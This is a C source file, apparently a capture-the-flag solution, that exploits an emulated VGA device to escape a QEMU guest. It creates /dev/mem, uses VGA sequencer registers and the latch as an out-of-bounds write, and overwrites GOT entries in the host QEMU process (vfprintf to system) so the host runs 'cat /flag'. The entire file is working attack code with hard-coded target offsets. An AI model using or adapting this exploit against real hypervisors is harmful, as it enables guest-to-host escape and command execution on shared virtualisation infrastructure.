#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>

#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << PAGE_SHIFT)

void die(const char *msg)
{
    perror(msg);
    exit(-1);
}

size_t va2pa(void *addr)
{
    uint64_t data;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (!fd)
    {
        perror("open pagemap");
        return 0;
    }

    size_t offset = ((uintptr_t)addr / PAGE_SIZE) * sizeof(uint64_t);

    if (lseek(fd, offset, SEEK_SET) < 0)
    {
        puts("lseek");
        close(fd);
        return 0;
    }

    if (read(fd, &data, 8) != 8)
    {
        puts("read");
        close(fd);
        return 0;
    }

    if (!(data & (((uint64_t)1 << 63))))
    {
        puts("page");
        close(fd);
        return 0;
    }

    size_t pageframenum = data & ((1ull << 55) - 1);
    size_t phyaddr = pageframenum * PAGE_SIZE + (uintptr_t)addr % PAGE_SIZE;

    close(fd);

    return phyaddr;
}

uint32_t vga_addr = 0xa0000;
uint32_t vga_size = 0x20000;

unsigned char *mmio_mem;
unsigned char *vga_mem;

void set_sr(unsigned int idx, unsigned int val)
{
    outb(idx, 0x3c4);
    outb(val, 0x3c5);
}

void vga_mem_write(uint32_t addr, uint8_t value)
{
    *((uint8_t *)(vga_mem + addr)) = value;
}

void set_latch(uint32_t value)
{
    char a;
    a = vga_mem[(value >> 16) & 0xffff]; // write hight
    write(1, &a, 1);
    a = vga_mem[value & 0xffff]; // write low
    write(1, &a, 1);
}

int main()
{
    system("mknod -m 660 /dev/mem c 1 1");
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd == -1)
    {
        return 0;
    }

    vga_mem = mmap(NULL, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr);
    if (!vga_mem)
    {
        die("mmap vga mem failed");
    }

    if (ioperm(0x3b0, 0x30, 1) == -1)
    {
        die("cannot ioperm");
    }

    set_sr(7, 1);       // bypass first if
    set_sr(0xcc, 4);    // v7==4
    set_sr(0xcd, 0x10); // vs[0x10]

    unsigned long long int bss = 0x109e000 + 0x500;
    unsigned long long int qemu_logfile = 0x10CCBE0;
    unsigned long long int vfprintf_got = 0xee7bb0;
    unsigned long long int system_plt = 0x409dd0;
    unsigned long long int printf_chk_got = 0xee7028;
    unsigned long long int qemu_log = 0x9726E8;

    char cat_flag[] = "cat /flag";
    char a;
    char *payload;
    int cur_size = 0;

    a = vga_mem[1];
    write(1, &a, 1);
    set_latch(bss);
    for (int i = 0; i < 9; i++)
    {
        write(1, &cat_flag[i], 1);
        vga_mem_write(0x18100, cat_flag[i]);
    }
    cur_size += 9;

    set_latch(qemu_logfile - cur_size);
    payload = (char *)&bss;
    for (int i = 0; i < 8; i++)
    {
        write(1, &payload[i], 1);
        vga_mem_write(0x18100, payload[i]);
    }
    cur_size += 8;

    set_latch(vfprintf_got - cur_size);
    payload = (char *)&system_plt;
    for (int i = 0; i < 8; i++)
    {
        write(1, &payload[i], 1);
        vga_mem_write(0x18100, payload[i]);
    }
    cur_size += 8;

    set_latch(printf_chk_got - cur_size);
    payload = (char *)&qemu_log;
    for (int i = 0; i < 8; i++)
    {
        write(1, &payload[i], 1);
        vga_mem_write(0x18100, payload[i]);
    }
    cur_size += 8;

    set_sr(0xcc, 2);
    vga_mem_write(0x18100, 1);

    return 0;
}